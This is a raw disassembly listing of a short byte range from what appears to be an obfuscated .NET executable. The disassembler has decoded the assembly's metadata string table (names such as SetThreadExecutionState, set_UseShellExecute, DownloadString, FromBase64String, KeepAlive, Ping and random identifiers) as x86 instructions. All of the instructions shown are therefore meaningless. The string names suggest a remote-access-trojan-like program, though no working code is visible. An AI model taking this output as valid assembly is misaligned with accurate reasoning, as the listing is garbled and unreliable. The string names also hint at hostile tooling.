  408512:	43                   	inc    %ebx
  408513:	65 72 74             	gs jb  0x40858a
  408516:	69 66 69 63 61 74 65 	imul   $0x65746163,0x69(%esi),%esp
  40851d:	00 43 72             	add    %al,0x72(%ebx)
  408520:	65 61                	gs popa
  408522:	74 65                	je     0x408589
  408524:	00 53 65             	add    %dl,0x65(%ebx)
  408527:	74 54                	je     0x40857d
  408529:	68 72 65 61 64       	push   $0x64616572
  40852e:	45                   	inc    %ebp
  40852f:	78 65                	js     0x408596
  408531:	63 75 74             	arpl   %esi,0x74(%ebp)
  408534:	69 6f 6e 53 74 61 74 	imul   $0x74617453,0x6e(%edi),%ebp
  40853b:	65 00 44 65 6c       	add    %al,%gs:0x6c(%ebp,%eiz,2)
  408540:	65 74 65             	gs je  0x4085a8
  408543:	00 43 61             	add    %al,0x61(%ebx)
  408546:	6c                   	insb   (%dx),%es:(%edi)
  408547:	6c                   	insb   (%dx),%es:(%edi)
  408548:	53                   	push   %ebx
  408549:	69 74 65 00 57 72 69 	imul   $0x74697257,0x0(%ebp,%eiz,2),%esi
  408550:	74 
  408551:	65 00 43 6f          	add    %al,%gs:0x6f(%ebx)
  408555:	6d                   	insl   (%dx),%es:(%edi)
  408556:	70 69                	jo     0x4085c1
  408558:	6c                   	insb   (%dx),%es:(%edi)
  408559:	65 72 47             	gs jb  0x4085a3
  40855c:	65 6e                	outsb  %gs:(%esi),(%dx)
  40855e:	65 72 61             	gs jb  0x4085c2
  408561:	74 65                	je     0x4085c8
  408563:	64 41                	fs inc %ecx
  408565:	74 74                	je     0x4085db
  408567:	72 69                	jb     0x4085d2
  408569:	62 75 74             	bound  %esi,0x74(%ebp)
  40856c:	65 00 44 65 62       	add    %al,%gs:0x62(%ebp,%eiz,2)
  408571:	75 67                	jne    0x4085da
  408573:	67 61                	addr16 popa
  408575:	62 6c 65 41          	bound  %ebp,0x41(%ebp,%eiz,2)
  408579:	74 74                	je     0x4085ef
  40857b:	72 69                	jb     0x4085e6
  40857d:	62 75 74             	bound  %esi,0x74(%ebp)
  408580:	65 00 43 6f          	add    %al,%gs:0x6f(%ebx)
  408584:	6d                   	insl   (%dx),%es:(%edi)
  408585:	56                   	push   %esi
  408586:	69 73 69 62 6c 65 41 	imul   $0x41656c62,0x69(%ebx),%esi
  40858d:	74 74                	je     0x408603
  40858f:	72 69                	jb     0x4085fa
  408591:	62 75 74             	bound  %esi,0x74(%ebp)
  408594:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  408598:	73 65                	jae    0x4085ff
  40859a:	6d                   	insl   (%dx),%es:(%edi)
  40859b:	62 6c 79 54          	bound  %ebp,0x54(%ecx,%edi,2)
  40859f:	69 74 6c 65 41 74 74 	imul   $0x72747441,0x65(%esp,%ebp,2),%esi
  4085a6:	72 
  4085a7:	69 62 75 74 65 00 41 	imul   $0x41006574,0x75(%edx),%esp
  4085ae:	73 73                	jae    0x408623
  4085b0:	65 6d                	gs insl (%dx),%es:(%edi)
  4085b2:	62 6c 79 54          	bound  %ebp,0x54(%ecx,%edi,2)
  4085b6:	72 61                	jb     0x408619
  4085b8:	64 65 6d             	fs gs insl (%dx),%es:(%edi)
  4085bb:	61                   	popa
  4085bc:	72 6b                	jb     0x408629
  4085be:	41                   	inc    %ecx
  4085bf:	74 74                	je     0x408635
  4085c1:	72 69                	jb     0x40862c
  4085c3:	62 75 74             	bound  %esi,0x74(%ebp)
  4085c6:	65 00 54 61 72       	add    %dl,%gs:0x72(%ecx,%eiz,2)
  4085cb:	67 65 74 46          	addr16 gs je 0x408615
  4085cf:	72 61                	jb     0x408632
  4085d1:	6d                   	insl   (%dx),%es:(%edi)
  4085d2:	65 77 6f             	gs ja  0x408644
  4085d5:	72 6b                	jb     0x408642
  4085d7:	41                   	inc    %ecx
  4085d8:	74 74                	je     0x40864e
  4085da:	72 69                	jb     0x408645
  4085dc:	62 75 74             	bound  %esi,0x74(%ebp)
  4085df:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  4085e3:	73 65                	jae    0x40864a
  4085e5:	6d                   	insl   (%dx),%es:(%edi)
  4085e6:	62 6c 79 46          	bound  %ebp,0x46(%ecx,%edi,2)
  4085ea:	69 6c 65 56 65 72 73 	imul   $0x69737265,0x56(%ebp,%eiz,2),%ebp
  4085f1:	69 
  4085f2:	6f                   	outsl  %ds:(%esi),(%dx)
  4085f3:	6e                   	outsb  %ds:(%esi),(%dx)
  4085f4:	41                   	inc    %ecx
  4085f5:	74 74                	je     0x40866b
  4085f7:	72 69                	jb     0x408662
  4085f9:	62 75 74             	bound  %esi,0x74(%ebp)
  4085fc:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  408600:	73 65                	jae    0x408667
  408602:	6d                   	insl   (%dx),%es:(%edi)
  408603:	62 6c 79 43          	bound  %ebp,0x43(%ecx,%edi,2)
  408607:	6f                   	outsl  %ds:(%esi),(%dx)
  408608:	6e                   	outsb  %ds:(%esi),(%dx)
  408609:	66 69 67 75 72 61    	imul   $0x6172,0x75(%edi),%sp
  40860f:	74 69                	je     0x40867a
  408611:	6f                   	outsl  %ds:(%esi),(%dx)
  408612:	6e                   	outsb  %ds:(%esi),(%dx)
  408613:	41                   	inc    %ecx
  408614:	74 74                	je     0x40868a
  408616:	72 69                	jb     0x408681
  408618:	62 75 74             	bound  %esi,0x74(%ebp)
  40861b:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  40861f:	73 65                	jae    0x408686
  408621:	6d                   	insl   (%dx),%es:(%edi)
  408622:	62 6c 79 44          	bound  %ebp,0x44(%ecx,%edi,2)
  408626:	65 73 63             	gs jae 0x40868c
  408629:	72 69                	jb     0x408694
  40862b:	70 74                	jo     0x4086a1
  40862d:	69 6f 6e 41 74 74 72 	imul   $0x72747441,0x6e(%edi),%ebp
  408634:	69 62 75 74 65 00 44 	imul   $0x44006574,0x75(%edx),%esp
  40863b:	65 66 61             	gs popaw
  40863e:	75 6c                	jne    0x4086ac
  408640:	74 4d                	je     0x40868f
  408642:	65 6d                	gs insl (%dx),%es:(%edi)
  408644:	62 65 72             	bound  %esp,0x72(%ebp)
  408647:	41                   	inc    %ecx
  408648:	74 74                	je     0x4086be
  40864a:	72 69                	jb     0x4086b5
  40864c:	62 75 74             	bound  %esi,0x74(%ebp)
  40864f:	65 00 43 6f          	add    %al,%gs:0x6f(%ebx)
  408653:	6d                   	insl   (%dx),%es:(%edi)
  408654:	70 69                	jo     0x4086bf
  408656:	6c                   	insb   (%dx),%es:(%edi)
  408657:	61                   	popa
  408658:	74 69                	je     0x4086c3
  40865a:	6f                   	outsl  %ds:(%esi),(%dx)
  40865b:	6e                   	outsb  %ds:(%esi),(%dx)
  40865c:	52                   	push   %edx
  40865d:	65 6c                	gs insb (%dx),%es:(%edi)
  40865f:	61                   	popa
  408660:	78 61                	js     0x4086c3
  408662:	74 69                	je     0x4086cd
  408664:	6f                   	outsl  %ds:(%esi),(%dx)
  408665:	6e                   	outsb  %ds:(%esi),(%dx)
  408666:	73 41                	jae    0x4086a9
  408668:	74 74                	je     0x4086de
  40866a:	72 69                	jb     0x4086d5
  40866c:	62 75 74             	bound  %esi,0x74(%ebp)
  40866f:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  408673:	73 65                	jae    0x4086da
  408675:	6d                   	insl   (%dx),%es:(%edi)
  408676:	62 6c 79 50          	bound  %ebp,0x50(%ecx,%edi,2)
  40867a:	72 6f                	jb     0x4086eb
  40867c:	64 75 63             	fs jne 0x4086e2
  40867f:	74 41                	je     0x4086c2
  408681:	74 74                	je     0x4086f7
  408683:	72 69                	jb     0x4086ee
  408685:	62 75 74             	bound  %esi,0x74(%ebp)
  408688:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  40868c:	73 65                	jae    0x4086f3
  40868e:	6d                   	insl   (%dx),%es:(%edi)
  40868f:	62 6c 79 43          	bound  %ebp,0x43(%ecx,%edi,2)
  408693:	6f                   	outsl  %ds:(%esi),(%dx)
  408694:	70 79                	jo     0x40870f
  408696:	72 69                	jb     0x408701
  408698:	67 68 74 41 74 74    	addr16 push $0x74744174
  40869e:	72 69                	jb     0x408709
  4086a0:	62 75 74             	bound  %esi,0x74(%ebp)
  4086a3:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  4086a7:	73 65                	jae    0x40870e
  4086a9:	6d                   	insl   (%dx),%es:(%edi)
  4086aa:	62 6c 79 43          	bound  %ebp,0x43(%ecx,%edi,2)
  4086ae:	6f                   	outsl  %ds:(%esi),(%dx)
  4086af:	6d                   	insl   (%dx),%es:(%edi)
  4086b0:	70 61                	jo     0x408713
  4086b2:	6e                   	outsb  %ds:(%esi),(%dx)
  4086b3:	79 41                	jns    0x4086f6
  4086b5:	74 74                	je     0x40872b
  4086b7:	72 69                	jb     0x408722
  4086b9:	62 75 74             	bound  %esi,0x74(%ebp)
  4086bc:	65 00 52 75          	add    %dl,%gs:0x75(%edx)
  4086c0:	6e                   	outsb  %ds:(%esi),(%dx)
  4086c1:	74 69                	je     0x40872c
  4086c3:	6d                   	insl   (%dx),%es:(%edi)
  4086c4:	65 43                	gs inc %ebx
  4086c6:	6f                   	outsl  %ds:(%esi),(%dx)
  4086c7:	6d                   	insl   (%dx),%es:(%edi)
  4086c8:	70 61                	jo     0x40872b
  4086ca:	74 69                	je     0x408735
  4086cc:	62 69 6c             	bound  %ebp,0x6c(%ecx)
  4086cf:	69 74 79 41 74 74 72 	imul   $0x69727474,0x41(%ecx,%edi,2),%esi
  4086d6:	69 
  4086d7:	62 75 74             	bound  %esi,0x74(%ebp)
  4086da:	65 00 73 65          	add    %dh,%gs:0x65(%ebx)
  4086de:	74 5f                	je     0x40873f
  4086e0:	55                   	push   %ebp
  4086e1:	73 65                	jae    0x408748
  4086e3:	53                   	push   %ebx
  4086e4:	68 65 6c 6c 45       	push   $0x456c6c65
  4086e9:	78 65                	js     0x408750
  4086eb:	63 75 74             	arpl   %esi,0x74(%ebp)
  4086ee:	65 00 52 65          	add    %dl,%gs:0x65(%edx)
  4086f2:	61                   	popa
  4086f3:	64 42                	fs inc %edx
  4086f5:	79 74                	jns    0x40876b
  4086f7:	65 00 57 72          	add    %dl,%gs:0x72(%edi)
  4086fb:	69 74 65 42 79 74 65 	imul   $0x657479,0x42(%ebp,%eiz,2),%esi
  408702:	00 
  408703:	44                   	inc    %esp
  408704:	65 6c                	gs insb (%dx),%es:(%edi)
  408706:	65 74 65             	gs je  0x40876e
  408709:	56                   	push   %esi
  40870a:	61                   	popa
  40870b:	6c                   	insb   (%dx),%es:(%edi)
  40870c:	75 65                	jne    0x408773
  40870e:	00 47 65             	add    %al,0x65(%edi)
  408711:	74 56                	je     0x408769
  408713:	61                   	popa
  408714:	6c                   	insb   (%dx),%es:(%edi)
  408715:	75 65                	jne    0x40877c
  408717:	00 53 65             	add    %dl,0x65(%ebx)
  40871a:	74 56                	je     0x408772
  40871c:	61                   	popa
  40871d:	6c                   	insb   (%dx),%es:(%edi)
  40871e:	75 65                	jne    0x408785
  408720:	00 67 65             	add    %ah,0x65(%edi)
  408723:	74 5f                	je     0x408784
  408725:	4b                   	dec    %ebx
  408726:	65 65 70 41          	gs gs jo 0x40876b
  40872a:	6c                   	insb   (%dx),%es:(%edi)
  40872b:	69 76 65 00 73 65 74 	imul   $0x74657300,0x65(%esi),%esi
  408732:	5f                   	pop    %edi
  408733:	4b                   	dec    %ebx
  408734:	65 65 70 41          	gs gs jo 0x408779
  408738:	6c                   	insb   (%dx),%es:(%edi)
  408739:	69 76 65 00 52 65 6d 	imul   $0x6d655200,0x65(%esi),%esi
  408740:	6f                   	outsl  %ds:(%esi),(%dx)
  408741:	76 65                	jbe    0x4087a8
  408743:	00 73 65             	add    %dh,0x65(%ebx)
  408746:	74 5f                	je     0x4087a7
  408748:	42                   	inc    %edx
  408749:	6c                   	insb   (%dx),%es:(%edi)
  40874a:	6f                   	outsl  %ds:(%esi),(%dx)
  40874b:	63 6b 53             	arpl   %ebp,0x53(%ebx)
  40874e:	69 7a 65 00 67 65 74 	imul   $0x74656700,0x65(%edx),%edi
  408755:	5f                   	pop    %edi
  408756:	54                   	push   %esp
  408757:	6f                   	outsl  %ds:(%esi),(%dx)
  408758:	74 61                	je     0x4087bb
  40875a:	6c                   	insb   (%dx),%es:(%edi)
  40875b:	53                   	push   %ebx
  40875c:	69 7a 65 00 67 65 74 	imul   $0x74656700,0x65(%edx),%edi
  408763:	5f                   	pop    %edi
  408764:	48                   	dec    %eax
  408765:	65 61                	gs popa
  408767:	64 65 72 53          	fs gs jb 0x4087be
  40876b:	69 7a 65 00 73 65 74 	imul   $0x74657300,0x65(%edx),%edi
  408772:	5f                   	pop    %edi
  408773:	48                   	dec    %eax
  408774:	65 61                	gs popa
  408776:	64 65 72 53          	fs gs jb 0x4087cd
  40877a:	69 7a 65 00 73 65 74 	imul   $0x74657300,0x65(%edx),%edi
  408781:	5f                   	pop    %edi
  408782:	53                   	push   %ebx
  408783:	65 6e                	outsb  %gs:(%esi),(%dx)
  408785:	64 42                	fs inc %edx
  408787:	75 66                	jne    0x4087ef
  408789:	66 65 72 53          	data16 gs jb 0x4087e0
  40878d:	69 7a 65 00 73 65 74 	imul   $0x74657300,0x65(%edx),%edi
  408794:	5f                   	pop    %edi
  408795:	52                   	push   %edx
  408796:	65 63 65 69          	arpl   %esp,%gs:0x69(%ebp)
  40879a:	76 65                	jbe    0x408801
  40879c:	42                   	inc    %edx
  40879d:	75 66                	jne    0x408805
  40879f:	66 65 72 53          	data16 gs jb 0x4087f6
  4087a3:	69 7a 65 00 73 65 74 	imul   $0x74657300,0x65(%edx),%edi
  4087aa:	5f                   	pop    %edi
  4087ab:	4b                   	dec    %ebx
  4087ac:	65 79 53             	gs jns 0x408802
  4087af:	69 7a 65 00 74 4a 42 	imul   $0x424a7400,0x65(%edx),%edi
  4087b6:	4b                   	dec    %ebx
  4087b7:	52                   	push   %edx
  4087b8:	63 4c 46 4a          	arpl   %ecx,0x4a(%esi,%eax,2)
  4087bc:	6d                   	insl   (%dx),%es:(%edi)
  4087bd:	61                   	popa
  4087be:	6a 46                	push   $0x46
  4087c0:	66 00 75 4d          	data16 add %dh,0x4d(%ebp)
  4087c4:	79 7a                	jns    0x408840
  4087c6:	59                   	pop    %ecx
  4087c7:	4e                   	dec    %esi
  4087c8:	42                   	inc    %edx
  4087c9:	4c                   	dec    %esp
  4087ca:	54                   	push   %esp
  4087cb:	64 64 4b             	fs fs dec %ebx
  4087ce:	66 00 67 48          	data16 add %ah,0x48(%edi)
  4087d2:	46                   	inc    %esi
  4087d3:	4c                   	dec    %esp
  4087d4:	4d                   	dec    %ebp
  4087d5:	63 4c 62 4a          	arpl   %ecx,0x4a(%edx,%eiz,2)
  4087d9:	55                   	push   %ebp
  4087da:	6a 4c                	push   $0x4c
  4087dc:	66 00 57 72          	data16 add %dl,0x72(%edi)
  4087e0:	4d                   	dec    %ebp
  4087e1:	6f                   	outsl  %ds:(%esi),(%dx)
  4087e2:	51                   	push   %ecx
  4087e3:	4f                   	dec    %edi
  4087e4:	4d                   	dec    %ebp
  4087e5:	76 63                	jbe    0x40884a
  4087e7:	61                   	popa
  4087e8:	61                   	popa
  4087e9:	52                   	push   %edx
  4087ea:	66 00 55 55          	data16 add %dl,0x55(%ebp)
  4087ee:	53                   	push   %ebx
  4087ef:	58                   	pop    %eax
  4087f0:	4b                   	dec    %ebx
  4087f1:	41                   	inc    %ecx
  4087f2:	67 69 4e 5a 64 57 66 	imul   $0x665764,0x5a(%bp),%ecx
  4087f9:	00 
  4087fa:	62 76 52             	bound  %esi,0x52(%esi)
  4087fd:	6d                   	insl   (%dx),%es:(%edi)
  4087fe:	47                   	inc    %edi
  4087ff:	59                   	pop    %ecx
  408800:	68 76 57 66 00       	push   $0x665776
  408805:	4f                   	dec    %edi
  408806:	51                   	push   %ecx
  408807:	79 50                	jns    0x408859
  408809:	42                   	inc    %edx
  40880a:	4b                   	dec    %ebx
  40880b:	4e                   	dec    %esi
  40880c:	5a                   	pop    %edx
  40880d:	43                   	inc    %ebx
  40880e:	61                   	popa
  40880f:	7a 64                	jp     0x408875
  408811:	66 00 44 62 48       	data16 add %al,0x48(%edx,%eiz,2)
  408816:	63 58 4e             	arpl   %ebx,0x4e(%eax)
  408819:	63 64 6a 4a          	arpl   %esp,0x4a(%edx,%ebp,2)
  40881d:	4c                   	dec    %esp
  40881e:	67 00 53 59          	add    %dl,0x59(%bp,%di)
  408822:	6c                   	insb   (%dx),%es:(%edi)
  408823:	55                   	push   %ebp
  408824:	56                   	push   %esi
  408825:	72 72                	jb     0x408899
  408827:	4a                   	dec    %edx
  408828:	61                   	popa
  408829:	4e                   	dec    %esi
  40882a:	70 64                	jo     0x408890
  40882c:	70 73                	jo     0x4088a1
  40882e:	4d                   	dec    %ebp
  40882f:	67 00 6c 54          	add    %ch,0x54(%si)
  408833:	4c                   	dec    %esp
  408834:	4b                   	dec    %ebx
  408835:	47                   	inc    %edi
  408836:	4b                   	dec    %ebx
  408837:	64 65 4a             	fs gs dec %edx
  40883a:	6b 51 67 00          	imul   $0x0,0x67(%ecx),%edx
  40883e:	57                   	push   %edi
  40883f:	5a                   	pop    %edx
  408840:	4e                   	dec    %esi
  408841:	6f                   	outsl  %ds:(%esi),(%dx)
  408842:	79 69                	jns    0x4088ad
  408844:	6e                   	outsb  %ds:(%esi),(%dx)
  408845:	41                   	inc    %ecx
  408846:	69 67 00 43 72 79 70 	imul   $0x70797243,0x0(%edi),%esp
  40884d:	74 6f                	je     0x4088be
  40884f:	43                   	inc    %ebx
  408850:	6f                   	outsl  %ds:(%esi),(%dx)
  408851:	6e                   	outsb  %ds:(%esi),(%dx)
  408852:	66 69 67 00 44 73    	imul   $0x7344,0x0(%edi),%sp
  408858:	5a                   	pop    %edx
  408859:	62 6e 53             	bound  %ebp,0x53(%esi)
  40885c:	47                   	inc    %edi
  40885d:	72 63                	jb     0x4088c2
  40885f:	62 6b 67             	bound  %ebp,0x67(%ebx)
  408862:	00 67 65             	add    %ah,0x65(%edi)
  408865:	74 5f                	je     0x4088c6
  408867:	50                   	push   %eax
  408868:	69 6e 67 00 73 65 74 	imul   $0x74657300,0x67(%esi),%ebp
  40886f:	5f                   	pop    %edi
  408870:	50                   	push   %eax
  408871:	69 6e 67 00 53 79 73 	imul   $0x73795300,0x67(%esi),%ebp
  408878:	74 65                	je     0x4088df
  40887a:	6d                   	insl   (%dx),%es:(%edi)
  40887b:	2e 54                	cs push %esp
  40887d:	68 72 65 61 64       	push   $0x64616572
  408882:	69 6e 67 00 73 65 74 	imul   $0x74657300,0x67(%esi),%ebp
  408889:	5f                   	pop    %edi
  40888a:	50                   	push   %eax
  40888b:	61                   	popa
  40888c:	64 64 69 6e 67 00 61 	fs imul $0x64646100,%fs:0x67(%esi),%ebp
  408893:	64 64 
  408895:	5f                   	pop    %edi
  408896:	53                   	push   %ebx
  408897:	65 73 73             	gs jae 0x40890d
  40889a:	69 6f 6e 45 6e 64 69 	imul   $0x69646e45,0x6e(%edi),%ebp
  4088a1:	6e                   	outsb  %ds:(%esi),(%dx)
  4088a2:	67 00 55 54          	add    %dl,0x54(%di)
  4088a6:	46                   	inc    %esi
  4088a7:	38 45 6e             	cmp    %al,0x6e(%ebp)
  4088aa:	63 6f 64             	arpl   %ebp,0x64(%edi)
  4088ad:	69 6e 67 00 53 79 73 	imul   $0x73795300,0x67(%esi),%ebp
  4088b4:	74 65                	je     0x40891b
  4088b6:	6d                   	insl   (%dx),%es:(%edi)
  4088b7:	2e 44                	cs inc %esp
  4088b9:	72 61                	jb     0x40891c
  4088bb:	77 69                	ja     0x408926
  4088bd:	6e                   	outsb  %ds:(%esi),(%dx)
  4088be:	67 2e 49             	addr16 cs dec %ecx
  4088c1:	6d                   	insl   (%dx),%es:(%edi)
  4088c2:	61                   	popa
  4088c3:	67 69 6e 67 00 53 79 	imul   $0x73795300,0x67(%bp),%ebp
  4088ca:	73 
  4088cb:	74 65                	je     0x408932
  4088cd:	6d                   	insl   (%dx),%es:(%edi)
  4088ce:	2e 52                	cs push %edx
  4088d0:	75 6e                	jne    0x408940
  4088d2:	74 69                	je     0x40893d
  4088d4:	6d                   	insl   (%dx),%es:(%edi)
  4088d5:	65 2e 56             	gs cs push %esi
  4088d8:	65 72 73             	gs jb  0x40894e
  4088db:	69 6f 6e 69 6e 67 00 	imul   $0x676e69,0x6e(%edi),%ebp
  4088e2:	46                   	inc    %esi
  4088e3:	72 6f                	jb     0x408954
  4088e5:	6d                   	insl   (%dx),%es:(%edi)
  4088e6:	42                   	inc    %edx
  4088e7:	61                   	popa
  4088e8:	73 65                	jae    0x40894f
  4088ea:	36 34 53             	ss xor $0x53,%al
  4088ed:	74 72                	je     0x408961
  4088ef:	69 6e 67 00 54 6f 42 	imul   $0x426f5400,0x67(%esi),%ebp
  4088f6:	61                   	popa
  4088f7:	73 65                	jae    0x40895e
  4088f9:	36 34 53             	ss xor $0x53,%al
  4088fc:	74 72                	je     0x408970
  4088fe:	69 6e 67 00 44 6f 77 	imul   $0x776f4400,0x67(%esi),%ebp
  408905:	6e                   	outsb  %ds:(%esi),(%dx)
  408906:	6c                   	insb   (%dx),%es:(%edi)
  408907:	6f                   	outsl  %ds:(%esi),(%dx)
  408908:	61                   	popa
  408909:	64 53                	fs push %ebx
  40890b:	74 72                	je     0x40897f
  40890d:	69 6e 67 00 54 6f 53 	imul   $0x536f5400,0x67(%esi),%ebp
  408914:	74 72                	je     0x408988
  408916:	69 6e 67 00 67 65 74 	imul   $0x74656700,0x67(%esi),%ebp
  40891d:	5f                   	pop    %edi
  40891e:	41                   	inc    %ecx
  40891f:	73 53                	jae    0x408974
  408921:	74 72                	je     0x408995
  408923:	69 6e 67 00 73 65 74 	imul   $0x74657300,0x67(%esi),%ebp
  40892a:	5f                   	pop    %edi
  40892b:	41                   	inc    %ecx
  40892c:	73 53                	jae    0x408981
  40892e:	74 72                	je     0x4089a2
  408930:	69 6e 67 00 47 65 74 	imul   $0x74654700,0x67(%esi),%ebp
  408937:	53                   	push   %ebx
  408938:	74 72                	je     0x4089ac
  40893a:	69 6e 67 00 53 75 62 	imul   $0x62755300,0x67(%esi),%ebp
  408941:	73 74                	jae    0x4089b7
  408943:	72 69                	jb     0x4089ae
  408945:	6e                   	outsb  %ds:(%esi),(%dx)
  408946:	67 00 53 79          	add    %dl,0x79(%bp,%di)
  40894a:	73 74                	jae    0x4089c0
  40894c:	65 6d                	gs insl (%dx),%es:(%edi)
  40894e:	2e 44                	cs inc %esp
  408950:	72 61                	jb     0x4089b3
  408952:	77 69                	ja     0x4089bd
  408954:	6e                   	outsb  %ds:(%esi),(%dx)
  408955:	67 00 73 65          	add    %dh,0x65(%bp,%di)
  408959:	74 5f                	je     0x4089ba
  40895b:	45                   	inc    %ebp
  40895c:	72 72                	jb     0x4089d0
  40895e:	6f                   	outsl  %ds:(%esi),(%dx)
  40895f:	72 44                	jb     0x4089a5
  408961:	69 61 6c 6f 67 00 69 	imul   $0x6900676f,0x6c(%ecx),%esp
  408968:	46                   	inc    %esi
  408969:	72 4e                	jb     0x4089b9
  40896b:	50                   	push   %eax
  40896c:	70 76                	jo     0x4089e4
  40896e:	48                   	dec    %eax
  40896f:	56                   	push   %esi
  408970:	75 79                	jne    0x4089eb
  408972:	79 67                	jns    0x4089db
  408974:	00 6c 62 55          	add    %ch,0x55(%edx,%eiz,2)
  408978:	4d                   	dec    %ebp
  408979:	4d                   	dec    %ebp
  40897a:	49                   	dec    %ecx
  40897b:	51                   	push   %ecx
  40897c:	52                   	push   %edx
  40897d:	45                   	inc    %ebp
  40897e:	5a                   	pop    %edx
  40897f:	64 56                	fs push %esi
  408981:	72 49                	jb     0x4089cc
  408983:	42                   	inc    %edx
  408984:	68 00 6b 47 4a       	push   $0x4a476b00
  408989:	47                   	inc    %edi
  40898a:	4f                   	dec    %edi
  40898b:	7a 68                	jp     0x4089f5
  40898d:	6c                   	insb   (%dx),%es:(%edi)
  40898e:	4d                   	dec    %ebp
  40898f:	4d                   	dec    %ebp
  408990:	4f                   	dec    %edi
  408991:	68 00 54 41 78       	push   $0x78415400
  408996:	62 56 7a             	bound  %edx,0x7a(%esi)
  408999:	45                   	inc    %ebp
  40899a:	76 45                	jbe    0x4089e1
  40899c:	6f                   	outsl  %ds:(%esi),(%dx)
  40899d:	5a                   	pop    %edx
  40899e:	68 00 44 4f 55       	push   $0x554f4400
  4089a3:	65 42                	gs inc %edx
  4089a5:	52                   	push   %edx
  4089a6:	4c                   	dec    %esp
  4089a7:	58                   	pop    %eax
  4089a8:	50                   	push   %eax
  4089a9:	47                   	inc    %edi
  4089aa:	62 5a 57             	bound  %ebx,0x57(%edx)
  4089ad:	65 68 00 42 65 48    	gs push $0x48654200
  4089b3:	62 54 73 61          	bound  %edx,0x61(%ebx,%esi,2)
  4089b7:	4e                   	dec    %esi
  4089b8:	7a 47                	jp     0x408a01
  4089ba:	64 64 69 68 00 43 6f 	fs imul $0x706d6f43,%fs:0x0(%eax),%ebp
  4089c1:	6d 70 
  4089c3:	75 74                	jne    0x408a39
  4089c5:	65 48                	gs dec %eax
  4089c7:	61                   	popa
  4089c8:	73 68                	jae    0x408a32
  4089ca:	00 56 65             	add    %dl,0x65(%esi)
  4089cd:	72 69                	jb     0x408a38
  4089cf:	66 79 48             	data16 jns 0x408a1a
  4089d2:	61                   	popa
  4089d3:	73 68                	jae    0x408a3d
  4089d5:	00 46 6c             	add    %al,0x6c(%esi)
  4089d8:	75 73                	jne    0x408a4d
  4089da:	68 00 67 65 74       	push   $0x74656700
  4089df:	5f                   	pop    %edi
  4089e0:	45                   	inc    %ebp
  4089e1:	78 65                	js     0x408a48
  4089e3:	63 75 74             	arpl   %esi,0x74(%ebp)
  4089e6:	61                   	popa
  4089e7:	62 6c 65 50          	bound  %ebp,0x50(%ebp,%eiz,2)
  4089eb:	61                   	popa
  4089ec:	74 68                	je     0x408a56
  4089ee:	00 47 65             	add    %al,0x65(%edi)
  4089f1:	74 54                	je     0x408a47
  4089f3:	65 6d                	gs insl (%dx),%es:(%edi)
  4089f5:	70 50                	jo     0x408a47
  4089f7:	61                   	popa
  4089f8:	74 68                	je     0x408a62
  4089fa:	00 67 65             	add    %ah,0x65(%edi)
  4089fd:	74 5f                	je     0x408a5e
  4089ff:	4c                   	dec    %esp
  408a00:	65 6e                	outsb  %gs:(%esi),(%dx)
  408a02:	67 74 68             	addr16 je 0x408a6d
  408a05:	00 6b 77             	add    %ch,0x77(%ebx)
  408a08:	7a 71                	jp     0x408a7b
  408a0a:	42                   	inc    %edx
  408a0b:	41                   	inc    %ecx
  408a0c:	7a 6a                	jp     0x408a78
  408a0e:	43                   	inc    %ebx
  408a0f:	78 77                	js     0x408a88
  408a11:	44                   	inc    %esp
  408a12:	69 00 54 4c 59 50    	imul   $0x50594c54,(%eax),%eax
  408a18:	4a                   	dec    %edx
  408a19:	50                   	push   %eax
  408a1a:	6e                   	outsb  %ds:(%esi),(%dx)
  408a1b:	63 69 7a             	arpl   %ebp,0x7a(%ecx)
  408a1e:	76 47                	jbe    0x408a67
  408a20:	69 00 67 5a 46 49    	imul   $0x49465a67,(%eax),%eax
  408a26:	57                   	push   %edi
  408a27:	45                   	inc    %ebp
  408a28:	78 65                	js     0x408a8f
  408a2a:	4e                   	dec    %esi
  408a2b:	4c                   	dec    %esp
  408a2c:	50                   	push   %eax
  408a2d:	69 00 55 72 69 00    	imul   $0x697255,(%eax),%eax
  408a33:	6a 67                	push   $0x67
  408a35:	74 54                	je     0x408a8b
  408a37:	45                   	inc    %ebp
  408a38:	6c                   	insb   (%dx),%es:(%edi)
  408a39:	4b                   	dec    %ebx
  408a3a:	53                   	push   %ebx
  408a3b:	4a                   	dec    %edx
  408a3c:	61                   	popa
  408a3d:	77 69                	ja     0x408aa8
  408a3f:	00 43 42             	add    %al,0x42(%ebx)
  408a42:	69 43 4c 49 63 58 78 	imul   $0x78586349,0x4c(%ebx),%eax
  408a49:	70 55                	jo     0x408aa0
  408a4b:	6c                   	insb   (%dx),%es:(%edi)
  408a4c:	62 51 6a             	bound  %edx,0x6a(%ecx)
  408a4f:	00 73 68             	add    %dh,0x68(%ebx)
  408a52:	53                   	push   %ebx
  408a53:	66 55                	push   %bp
  408a55:	59                   	pop    %ecx
  408a56:	54                   	push   %esp
  408a57:	69 50 54 6a 00 63 4e 	imul   $0x4e63006a,0x54(%eax),%edx
  408a5e:	4c                   	dec    %esp
  408a5f:	46                   	inc    %esi
  408a60:	65 41                	gs inc %ecx
  408a62:	59                   	pop    %ecx
  408a63:	76 7a                	jbe    0x408adf
  408a65:	77 52                	ja     0x408ab9
  408a67:	54                   	push   %esp
  408a68:	6a 00                	push   $0x0
  408a6a:	72 6d                	jb     0x408ad9
  408a6c:	44                   	inc    %esp
  408a6d:	6d                   	insl   (%dx),%es:(%edi)
  408a6e:	6c                   	insb   (%dx),%es:(%edi)
  408a6f:	6a 72                	push   $0x72
  408a71:	4d                   	dec    %ebp
  408a72:	59                   	pop    %ecx
  408a73:	68 56 57 6a 00       	push   $0x6a5756
  408a78:	6c                   	insb   (%dx),%es:(%edi)
  408a79:	73 5a                	jae    0x408ad5
  408a7b:	46                   	inc    %esi
  408a7c:	76 6a                	jbe    0x408ae8
  408a7e:	4e                   	dec    %esi
  408a7f:	4f                   	dec    %edi
  408a80:	70 6a                	jo     0x408aec
  408a82:	00 4d 52             	add    %cl,0x52(%ebp)
  408a85:	4f                   	dec    %edi
  408a86:	56                   	push   %esi
  408a87:	73 56                	jae    0x408adf
  408a89:	72 67                	jb     0x408af2
  408a8b:	7a 48                	jp     0x408ad5
  408a8d:	74 73                	je     0x408b02
